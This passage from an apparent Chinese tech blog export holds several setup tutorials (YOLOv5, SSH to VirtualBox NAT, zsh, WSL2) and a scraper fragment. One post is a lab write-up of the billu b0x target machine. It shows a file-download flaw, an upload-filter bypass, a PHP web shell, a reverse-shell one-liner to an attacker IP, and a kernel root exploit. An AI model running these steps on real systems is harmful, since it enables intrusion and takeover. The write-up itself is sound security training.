class="number">1</span>].select_one(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> publisher_elem:</span><br><span class="line">                product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">5</span>][<span class="string">&quot;value&quot;</span>] = publisher_elem.text.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(spans) &gt; <span class="number">2</span>:</span><br><span class="line">            product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">6</span>][<span class="string">&quot;value&quot;</span>] = spans[<span class="number">2</span>].text.split(<span class="string">&#x27;:&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].strip()</span><br><span class="line">    <span class="comment"># ⑨提取ISBN和帧装</span></span><br><span class="line">    key_ul = soup.select_one(<span class="string">&#x27;ul.key.clearfix&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_ul:</span><br><span class="line">        lis = key_ul.select(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(lis) &gt; <span class="number">2</span>:  <span class="comment"># 第三个li为帧装</span></span><br><span class="line">            framing_text = lis[<span class="number">2</span>].text.strip()</span><br><span class="line">            product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">3</span>][<span class="string">&quot;value&quot;</span>] = framing_text.split(<span class="string">&#x27;：&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].strip()    </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(lis) &gt; <span class="number">4</span>:  <span class="comment"># 第五个li为ISBN</span></span><br><span class="line">            isbn_text = lis[<span class="number">4</span>].text.strip()</span><br><span class="line">            product_info[<span class="string">&quot;specifications&quot;</span>][<span class="number">2</span>][<span class="string">&quot;value&quot;</span>] = isbn_text.split(<span class="string">&#x27;：&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> product_info</span><br></pre></td></tr></table></figure><p>一点儿吐槽：<del>ai是真好用啊，感觉我不如ai一根。</del>当当网的网页结构是真的丑，甚至每本书各自的标签爬下来和主页的标签分类对不上，还要手动调整，也是被整无语了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yolov5环境配置教程</title>
      <link href="/post/9807c50b.html"/>
      <url>/post/9807c50b.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：本学期因为大创需要使用yolov模型来进行相关的工作，故记录如下。使用的系统为Ubuntu18.04.</p><h2 id="1-安装Anaconda"><a href="#1-安装Anaconda" class="headerlink" title="1.安装Anaconda"></a>1.安装Anaconda</h2><ul><li><p>访问<a href="https://repo.anaconda.com/archive/Anaconda3-2024.10-1-Linux-x86_64.sh">Anaconda官网下载合适版本</a>。</p></li><li><p>导航到下载目录：使用cd命令导航到下载目录。例如，如果下载文件在Downloads目录下：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/Downloads</span><br></pre></td></tr></table></figure></li><li><p>运行安装脚本：使用bash命令运行下载的安装脚本：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash Anaconda3-2024.10-1-Linux-x86_64.sh</span><br></pre></td></tr></table></figure></li><li><p>阅读并接受许可协议：在安装过程中，会显示许可协议，按q键跳过，然后输入yes接受协议。</p></li><li><p>选择安装路径：默认安装路径是&#x2F;home&#x2F;your_username&#x2F;anaconda3，可以按Enter接受默认路径，或者输入其他路径。</p></li><li><p>初始化Anaconda：安装完成后，系统会提示是否初始化Anaconda，输入yes以启用。</p></li><li><p>更新环境变量：安装完成后，关闭并重新打开终端，或者运行以下命令使环境变量生效：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure></li><li><p>验证安装：在终端中输入以下命令，检查Anaconda是否安装成功：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda --version</span><br></pre></td></tr></table></figure><p>  如果安装成功，会显示Anaconda的版本号。</p></li><li><p>创建虚拟环境：打开终端，输入以下命令创建一个名为yolov5的虚拟环境，并指定Python版本为3.12(官方的文档里说明的是python版本大于等于3.8.0)：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create -n yolov5 python=3.12</span><br><span class="line">conda activate yolov5</span><br></pre></td></tr></table></figure></li></ul><h2 id="2-安装pytorch"><a href="#2-安装pytorch" class="headerlink" title="2.安装pytorch"></a>2.安装pytorch</h2><ul><li><p>安装PyTorch(官方的文档里说明的是pytorch版本大于等于1.8)：如果你可以直连n卡(比如真机，双系统和使用了kvm虚拟化的wsl)，下载GPU版本的pytorch：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install pytorch torchvision torchaudio pytorch-cuda=11.7 -c pytorch -c nvidia</span><br></pre></td></tr></table></figure><p>  否则使用CPU版本的pytorch：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install pytorch torchvision torchaudio cpuonly -c pytorch</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-安装相关依赖"><a href="#3-安装相关依赖" class="headerlink" title="3.安装相关依赖"></a>3.安装相关依赖</h2><ul><li><p>安装依赖：在YOLOv5项目根目录下，运行以下命令安装所有必需的Python包：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li></ul><h2 id="4-验证安装"><a href="#4-验证安装" class="headerlink" title="4.验证安装"></a>4.验证安装</h2><ul><li><p>下载预训练模型：从YOLOv5的GitHub发布页面下载预训练模型，并将其放置在YOLOv5项目目录下。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/ultralytics/yolov5/releases/download/v6.2/yolov5s.pt</span><br></pre></td></tr></table></figure></li><li><p>验证安装：运行一个简单的推理脚本来验证YOLOv5是否正确安装：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python detect.py --<span class="built_in">source</span> ./datahttps://my-github-blog.oss-cn-hangzhou.aliyuncs.coms/ --weights ./yolov5s.pt</span><br></pre></td></tr></table></figure></li></ul><h2 id="5-相关的官方链接"><a href="#5-相关的官方链接" class="headerlink" title="5.相关的官方链接"></a>5.相关的官方链接</h2><ul><li>源仓库的github链接：<a href="https://github.com/ultralytics/yolov5">yolov5源仓库</a></li><li>官方教程文档：<a href="https://docs.ultralytics.com/zh/yolov5/">yolov5教程</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> yolov </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络攻防实战billu b0x打靶思路</title>
      <link href="/post/b858f09.html"/>
      <url>/post/b858f09.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：思路不同于cy老师上课讲的，故在此记录一下。</p><h2 id="一、扫描端口"><a href="#一、扫描端口" class="headerlink" title="一、扫描端口"></a>一、扫描端口</h2><p>首先还是尝试非常经典的扫描端口，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l <span class="comment">#查找靶机ip</span></span><br><span class="line">nmap -p- 10.0.2.13 -sV –min-rate 50000 –min-hostgroup 100 <span class="comment">#查找靶机暴露的端口以及其具体信息</span></span><br></pre></td></tr></table></figure><p>发现结果如下：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/f85375a98414cad4082aca7e49362cb1.png" alt="靶机ip"></p><p>尝试寻找相应的漏洞后(使用<code>searchsploit</code>命令)，没有发现可利用的漏洞，故进行到下一步。</p><h2 id="二、尝试破解登录"><a href="#二、尝试破解登录" class="headerlink" title="二、尝试破解登录"></a>二、尝试破解登录</h2><ul><li>首先尝试使用seclist中提供的目录来进行爆破，但是因为burpsuite没开会员，等待时间非常长，故选择放弃。</li><li>很容易想到经典的目录搜索<code>dirsearch -u 10.0.2.13</code>来寻找泄露的信息，发现了非常多的可用网页：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/94eeb0452789faa77ff51f5e92fa44ef.png" alt="目录搜索"><br>故对各网页进行尝试，在访问<code>10.0.2.13/test</code>这个网页的时候发现了任意文件下载漏洞，先尝试GET类型的请求方法来进行尝试：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/50f3881561803610a03c3027d50698ea.png" alt="test.php"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/bb9faf6ca59c95d0f8865a5fe1d1bd61.png" alt="GET1"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/d898310f77c3b2c5c622fb872d9b6cbb.png" alt="GET2"><br>发现没有返回结果，故利用burpsuite工具来尝试修改请求类型，将GET请求转化为POST请求，得到如下结果：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/58b9fe731240af6e6b48f5a7af70aab9.png" alt="POST1"><br>发现成功得到了<code>/etc/passwd</code>里的内容，利用这个工具去查看前面发现的网页的内容，很“幸运”地发现了<code>/c</code>网页里的疑似数据库相关的信息：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/a10a8561bfe5aa0eaf02c275bf4be1df.png" alt="POST2"><br>将数据库和密码输入到<code>10.0.2.13/phpmy</code>，发现成功登录：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/3279a1e20775411b56c848434018a9d1.png" alt="数据库登录"><br>在phpmy网页中的auth一栏下发现了疑似网页的登录信息，将用户名和密码输入10.0.2.13这个网页中并发现能成功登录：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/940af7e60576e421cc8b4bc1605911cb.png" alt="网页登陆1"><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/03c42f4b0972ddddbb21a4b6b8a6dd38.png" alt="网页登陆2"></li></ul><h2 id="三、尝试反弹shell"><a href="#三、尝试反弹shell" class="headerlink" title="三、尝试反弹shell"></a>三、尝试反弹shell</h2><p>登陆上这个网页后，发现这个网站有上传图片的功能，很容易想到有可能可以利用的任意文件上传漏洞，先尝试直接上传<code>.php</code>文件，发现它会检查文件类型，将后缀名修改后也不能传输成功。说明网站不只是简单地进行了后缀名的检测，故尝试修改文件头来通过检测。将文件头的十六进制修改为<code>89504e470d0a1a0a</code>发现成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/770356d662f44b87159678359834e39c.png" alt="上传文件"></p><ul><li><p>思路一：<br>复制文件路径找到了<code>uploaded_images</code>的文件路径，拦截<code>show images</code>的请求，发现了命令执行漏洞，将load路径改为<code>uploaded_images/test.png</code>并修改<code>test.png</code>文件内容为<code>php-reverse-shell</code>文件的内容并重新上传，在终端中输入<code>nc -nvlp 1234</code>监听1234端口(<code>php-reverse-shell</code>文件中的ip地址和端口也要进行相应的修改)发现反弹shell成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/657b7cee052a9e8f40225abacc5b48d7.png" alt="反弹成功1"></p></li><li><p>思路二：<br>使用一句话木马以能在网站上运行命令，将<code>test.png</code>文件中的内容改为<code>&lt;?php system($_POST[‘cmd’]);?&gt;</code>，这个时候在拦截的POST请求的末尾加上<code>&amp;cmd=ls</code>，这个时候发现输出了文件目录中的内容，说明网站并没有限制一些敏感的参数。故将<code>php -r &#39;$sock=fsockopen(&quot;10.0.2.11&quot;,1234);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code>先编码为url格式再复制到<code>&amp;cmd=</code>后面，发现反弹shell成功：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/8b14422e0a5b452ef833e53bbe2ebc3c.png" alt="反弹成功2"></p></li></ul><h2 id="四、获取靶机root权限"><a href="#四、获取靶机root权限" class="headerlink" title="四、获取靶机root权限"></a>四、获取靶机root权限</h2><p>如果在之前查看了<code>/in</code>网页，很容易就可以发现靶机的内核信息过低：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/97c7819de7a0154dc34e75fa3317bee5.png" alt="内核信息"></p><p>如果查看<code>/in</code>网页也没有太大关系，输入以下命令可以查看靶机的内核版本以及发行版版本等各详细信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a <span class="comment">#查看内核信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*-release <span class="comment">#查看发行版版本等其他信息</span></span><br></pre></td></tr></table></figure><p>接下来的事情就比较简单了，输入以下命令来完成内核漏洞的爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在主机上：</span></span><br><span class="line">searchsploit privilege | grep 3.13 | grep linux <span class="comment">#查找可以利用的内核漏洞，发现编号为37292的文件</span></span><br><span class="line">searchsploit -m 37292 <span class="comment">#将该文件下载到本机</span></span><br><span class="line">python -m http.server:80 <span class="comment">#开启http服务方便靶机从主机下载文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在靶机上</span></span><br><span class="line"><span class="built_in">which</span> gcc <span class="comment">#检查运行环境，发现靶机有gcc工具，故不用管</span></span><br><span class="line">wget 10.0.2.11/37292.c <span class="comment">#从靶机上获取漏洞文件</span></span><br><span class="line">gcc 37292.c -o 37292 <span class="comment">#将.c文件编译链接为可执行文件</span></span><br><span class="line">./37292 <span class="comment">#执行文件来获得root权限</span></span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post5/49f523a8a93acf84df4012daf153be56.png" alt="结果"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 网络攻防 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过ssh连接VirtualBox的nat网络模式下的虚拟机</title>
      <link href="/post/46d9de96.html"/>
      <url>/post/46d9de96.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：因为这学期要上传奇史课os，课程要求使用OpenEuler系统，为了方便用vscode编程使用了ssh来连接虚拟机。折腾的过程中发现桥接模式会随着你网络环境他的变化而产生网段的变化导致ssh配置发生变动，而nat模式下的虚拟机ip不会产生改变。而使用nat网络模式来进行连接相对麻烦一点儿，故有了该文章。</p><h2 id="一、设置端口转发"><a href="#一、设置端口转发" class="headerlink" title="一、设置端口转发"></a>一、设置端口转发</h2><p>因为nat模式下尽管虚拟机ping得通主机，但是主机ping不通虚拟机的话ssh连接仍然是不可行的，所以必须要先进行端口转发。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/faf3354a84b2e246498fc6d54d9b36a3.png" alt="ping不通"><br>设置端口转发也非常简单，首先点击VirtualBox左上角的<strong>管理</strong>，选择其中的<strong>工具</strong>，在工具的菜单栏中选择<strong>网络管理器</strong>。或者是直接使用快捷键<code>Ctrl+H</code>打开。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/2025-03-02211905.png" alt="网络管理器"><br>之后先点开<strong>属性</strong>，选择<strong>NAT网络</strong>，在下方选择<strong>端口转发</strong>，点击右边的”+“添加新规则。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/696a0650dd9826ab8672748c8fb4952e.png" alt="端口转发"><br>主机ip和子系统端口和上图保持一致，除非你ssh端口自定义了非22端口。主机端口可以自己改动，只要该端口没有被占用就行。需要注意的是子系统ip要和你的虚拟机保持一致。至于如何获得子系统的ip，需要打开子系统输入命令<code>ip addr</code>来查看，一般如果你没有进行特别的修改，ip都应该为<code>10.0.2.xx</code>。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/0959d4c2d5f800fd252dcea6d92442ac.png" alt="子系统ip"><br>输入好后，点击右下角的应用开始转发。</p><h2 id="二、虚拟机的准备"><a href="#二、虚拟机的准备" class="headerlink" title="二、虚拟机的准备"></a>二、虚拟机的准备</h2><p>要想进行ssh连接，你的虚拟机必须要开启sshd服务，关于如何安装sshd服务请左转自行谷歌。<br>输入以下命令来设置ssh服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sshd <span class="comment">#启用sshd开机自启动</span></span><br><span class="line">systemctl start sshd <span class="comment">#启用sshd服务</span></span><br><span class="line">systemctl status sshd <span class="comment">#查看sshd服务状态</span></span><br></pre></td></tr></table></figure><p>最后你的sshd服务状态应该类似于下图：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/aeff68d211b9570b69abd352cbb28854.png" alt="sshd-status"></p><h2 id="三、ssh相关设置"><a href="#三、ssh相关设置" class="headerlink" title="三、ssh相关设置"></a>三、ssh相关设置</h2><ul><li><p>测试连接<br>现在在确保虚拟机开着的情况下可以进行ssh的连接了。在cmd中输入以下命令<code>ssh -p 你设置的主机端口号 username(你想用什么身份登陆你的虚拟机)@127.0.0.1</code>来测试连接，若提示你输入密码进行登录则说明连接成功。</p></li><li><p>配置密钥登录<br>如果不配置密钥，在vscode中打开一个文件夹就要输入一次密码，极其的麻烦。而且以后工作的时候肯定是使用安全的密钥登录，所以用密钥登陆是很有必要的。</p><ul><li><p>在cmd输入命令<code>ssh-keygen -t rsa -b 4096</code>生成一对rsa密钥(之后一直回车即可)，如果你之前已经生成了密钥了，那就用你之前的密钥就行。</p></li><li><p>进入<code>C/Users/你的用户名/.ssh</code>文件夹，你应该在这里能找到你之前生成的密钥对。在这里右键打开terminal，输入命令<code>scp -P 你设置的主机端口号 id_rsa.pub username@127.0.0.1:~(可以改成你想要的目录)</code>，这一步是将公钥文件传给你的虚拟机。</p></li><li><p>打开你的虚拟机，找到你传入的公钥文件，输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li></ul></li><li><p>最后是对sshd的一些配置<br>修改<code>/etc/ssh/sshd_config</code>文件，将对应行修改成下面那样：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin prohibit-password #限制不能使用密码登录root用户</span><br><span class="line">PubkeyAuthentication yes #允许使用公钥进行登录</span><br><span class="line">PasswordAuthentication no #禁止使用密码登录</span><br><span class="line">AllowTcpForwarding yes #允许进行ssh端口的tcp转发</span><br></pre></td></tr></table></figure></li></ul><p>之后再进行ssh连接，你会发现直接连接成功，最后在vscode输入之前的ssh连接命令即可成功远程登陆虚拟机。</p><h2 id="四、踩过的坑"><a href="#四、踩过的坑" class="headerlink" title="四、踩过的坑"></a>四、踩过的坑</h2><p>因为我之前已经有了rsa密钥，我把生成的新的rsa密钥命名成了自定义的名字，然后发现怎么都连接不成功。搜索后发现原来ssh会按照一定顺序扫描已有的私钥，而自定义名字的私钥是最后扫描的，导致ssh在扫描到之前就认为你的私钥已经是错误的了(居然不是遍历！！！)。<br>这种情况需要在ssh连接命令中加入参数<code>-i</code>来指定你要使用的私钥来进行连接。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ssh </tag>
            
            <tag> 虚拟机 </tag>
            
            <tag> VirtualBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zsh的安装和简单配置</title>
      <link href="/post/88f7f195.html"/>
      <url>/post/88f7f195.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：本教程使用的是WSL2(Debian系统)，使用ArchLinux系或者RedHat系的操作系统可能在下面的操作中有些许不同之处。zsh有比bash更加丰富的扩展功能，在可自定义化和补全功能上都比bash要强大很多<del>(最重要的是zsh比bash的prompt好看多了)</del>。</p><h2 id="一、下载zsh并设置其为默认shell"><a href="#一、下载zsh并设置其为默认shell" class="headerlink" title="一、下载zsh并设置其为默认shell"></a>一、下载zsh并设置其为默认shell</h2><ul><li>下载zsh<br>下载zsh非常之简单，很多版本的Linux都提供了zsh的预编译包，可以通过系统的包管理器安装。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install zsh</span><br></pre></td></tr></table></figure><p>如果你的Linux使用的是其他包管理工具，比如yum或是pacman，请自行查找教程。</p><ul><li><p>将zsh设置为默认shell<br>首先要检查zsh是否安装成功，输入命令<code>zsh --version</code>后如果有类似于下面的输出，那说明安装成功了。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post3/dd48fdedf7063619e1708387b1d60e71.png" alt="zsh-version"><br>之后就是输入命令让zsh成为默认shell。</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /usr/bin/zsh</span><br></pre></td></tr></table></figure></li></ul><p>至此，zsh的下载安装已经完毕。</p><h2 id="二、下载oh-my-zsh并进行插件和主题的配置"><a href="#二、下载oh-my-zsh并进行插件和主题的配置" class="headerlink" title="二、下载oh-my-zsh并进行插件和主题的配置"></a>二、下载oh-my-zsh并进行插件和主题的配置</h2><p>oh-my-zsh是一个开源的zsh配置管理框架，旨在帮助用户快速上手zsh，并通过丰富的插件和主题让命令行体验更加高效、美观和个性化。<del>(上述内容由ai生成)</del></p><ul><li><p>下载oh-my-zsh<br>如果你在国内，可以使用gitee的镜像</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>  如果你在国外或者就是想用github，使用以下命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>下载powerlevel10k<br>powerlevel10k是一个自定义化程度相当之高且方便使用的主题配置工具，和上面的一样，可以选择从github或者gitee来下载：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://gitee.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br></pre></td></tr></table></figure><p>  下载完毕之后，编辑<code>~/.zshrc</code>文件，找到以下行并修改：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=&quot;主题名称&quot;</span><br><span class="line">#修改为：ZSH_THEME=&quot;powerlevel10k/powerlevel10k&quot;</span><br></pre></td></tr></table></figure><p>  保存并退出后执行命令<code>source ~/.zshrc</code>后会让你自定义prompt外观。<br>  如果你之后又想进行外观的修改，可以输入命令：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p10k configure</span><br></pre></td></tr></table></figure></li><li><p>下载两个常用插件<br>先编辑<code>~/.zshrc</code>文件，找到以下行并修改：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plugins=(git) </span><br><span class="line">#修改为：plugins=(git zsh-autosuggestions zsh-syntax-highlighting)</span><br></pre></td></tr></table></figure><p>  然后下载两个插件：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>  最后仍然是执行命令<code>source ~/.zshrc</code>使插件生效。</p></li></ul><p>以上就是zsh的安装和简单的配置，放一个我配置完的zsh的效果图：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post3/95f4d3600abefc9525dc9d907f96f21f.png" alt="zsh-example"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 教程 </tag>
            
            <tag> zsh </tag>
            
            <tag> 美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSL2的安装和简单配置</title>
      <link href="/post/87099e43.html"/>
      <url>/post/87099e43.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：本教程使用的是Windows11的系统，不保证Windows10也适用。</p><h2 id="一、为Windows启用Hyper-v虚拟化"><a href="#一、为Windows启用Hyper-v虚拟化" class="headerlink" title="一、为Windows启用Hyper-v虚拟化"></a>一、为Windows启用Hyper-v虚拟化</h2><ul><li><p>按下win键，打开开始菜单，在搜索框中搜索<code>powershell</code>并按下右键选择以管理员身份运行。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/0865930a85e7def3f66138ae61450941.png" alt="展示"></p></li><li><p>输入命令来执行虚拟化操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName $(<span class="string">&quot;Microsoft-Windows-Subsystem-Linux&quot;</span>,<span class="string">&quot;VirtualMachinePlatform&quot;</span>)</span><br></pre></td></tr></table></figure><p>  此操作需要重启，若询问是否立即重启执行操作，输入Y并按下回车键即可。</p></li></ul><h2 id="二、设置WSL2默认版本为version2"><a href="#二、设置WSL2默认版本为version2" class="headerlink" title="二、设置WSL2默认版本为version2"></a>二、设置WSL2默认版本为version2</h2><p>在之前的管理员powershell界面输入<code>wsl --set-default-version 2</code>即可，之后可以输入<code>wsl -v</code>来确定版本。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/168383ad282389c72db900a0869ef219.png" alt="wsl版本"><br>现在win11默认的wsl版本就是2，此操作也可以不做。</p><h2 id="三、下载Linux发行版"><a href="#三、下载Linux发行版" class="headerlink" title="三、下载Linux发行版"></a>三、下载Linux发行版</h2><h3 id="方案一：通过Microsoft-Store来进行下载"><a href="#方案一：通过Microsoft-Store来进行下载" class="headerlink" title="方案一：通过Microsoft Store来进行下载"></a>方案一：通过Microsoft Store来进行下载</h3><p>通过微软商店来下载非常简单，只需要在微软商店搜索对应的Linux发行版的名字即可进行下载。比如这里以下载ubuntu为例：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/d573d3eb16225db1e4a8dcf3c017d7b4.png" alt="Ubuntu"></p><h3 id="方案二：通过命令行来进行安装-推荐"><a href="#方案二：通过命令行来进行安装-推荐" class="headerlink" title="方案二：通过命令行来进行安装(推荐)"></a>方案二：通过命令行来进行安装(推荐)</h3><ul><li>使用<code>wsl -l -o</code>命令来查看当前可用的发行版。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/6b3a505f144d94c59fe6fb4d9589e697.png" alt="可用列表"></li><li>使用<code>wsl --install -d &lt;distribution name&gt;</code>命令来下载指定的Linux发行版，这里的distribution name就是指上面那个操作中的第一列列出来的名称。</li></ul><p>等待耐心下载完并弹出相应提示之后，安装过程就完成了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输出类似如下信息则启动成功</span></span><br><span class="line">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 